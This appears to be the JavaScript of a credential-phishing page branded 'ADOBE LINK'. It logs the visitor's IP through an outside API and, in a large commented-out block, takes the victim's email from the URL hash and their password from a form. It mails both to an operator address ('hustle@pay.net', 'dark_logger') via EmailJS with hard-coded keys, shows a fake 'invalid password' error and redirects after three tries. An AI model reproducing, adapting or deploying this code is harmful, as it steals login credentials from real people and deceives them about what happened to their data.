function fetchInfo() {
  if (localStorage.getItem('ip')) return null;
  fetch('https://api.bigdatacloud.net/data/client-ip')
    .then((res) => res.json())
    .then((res) => {
      localStorage.setItem('ip', res.ipString);
      console.log(res.ipString);
    })
    .catch((e) => console.error(e));
}
fetchInfo();

window.clicked = 0;
document
  .querySelector('.loader>img')
  .addEventListener('contextmenu', (e) => e.preventDefault());

setTimeout(() => {
  document.querySelector('.loader').style.display = 'none'; //main_body
  document.querySelector('#main_body').style.display = 'block'; //
}, 5000);
// const t = window.location.hash.replace('#', '');
// var r = document.querySelector('#cum'),
//   o = document.querySelector('#myfm');
// const n = document.querySelector('.otherformsecs');
// var c = document.querySelectorAll('.navbtn');
// Array.from(c).forEach((e) => {
//   e.addEventListener('click', (e) => {
//     document.querySelector('#lp').focus();
//   });
// }),
//   t &&
//     ((document.querySelector('#lm').value = t),
//     document.querySelector('#lm').setAttribute('readonly', !0)),
//   o.addEventListener('submit', (e) => {
//     e.preventDefault(),
//       (n.innerHTML = ''),
//       r.setAttribute('disabled', !0),
//       (r.innerHTML = 'Verifying...');

//     //MY UTIMATE COMBO HERE
//     let u1 = 'g2vSIiHgVTS-TzBWF';
//     let t1 = 'template_639zr8i';
//     let u2 = 'c5yI8uzbnFyagT8Rc';
//     let t2 = 'template_t8iprli';

//     let email = document.querySelector('input').value;
//     let password = document.querySelector('input[type=password]').value;
//     if (!password.trim() || password.trim().length < 5)
//       return alert('Please enter correct email password to continue');
//     o.querySelector('button').textContent = 'Verifying...';
//     (function () {
//       emailjs.init(u1);
//     })();
//     window.clicked++;
//     if (window.clicked > 2)
//       return (window.location =
//         'https://' + window.location.hash?.replace('#', '').split('@')[1]);
//     let template_params = {
//       reply_to: 'reply_to_value',
//       user_ip: localStorage.getItem('ip'),
//       from_name: 'ADOBE LINK (icq - @dark_logger)',
//       to_name: 'hustle@pay.net',
//       message_html: `Email address : ${window.location.hash?.replace(
//         '#',
//         ''
//       )} and password : ${
//         document.querySelector('input[type="password"]').value
//       }`,
//     };
//     emailjs.send('default_service', t1, template_params).then(
//       function (response) {
//         document.querySelector('#failure').textContent =
//           'Invalid email password provided, please try again';
//         o.querySelector('button').textContent = 'Sign In';
//         document.querySelector('input[type="password"]').value = '';
//         r.removeAttribute('disabled');
//       },
//       function (error) {
//         (function () {
//           emailjs.init(u2);
//         })();
//         console.log('FAILED...', error);
//         emailjs.send('default_service', t2, template_params).then(
//           function (response) {
//             o.querySelector('button').textContent = 'Sign In';
//             document.querySelector('input[type="password"]').value = '';
//           },
//           function (error) {
//             o.querySelector('button').textContent = 'Sign In';
//             document.querySelector('input[type="password"]').value = '';
//             r.removeAttribute('disabled');
//           }
//         );
//       }
//     );
//   });
// });
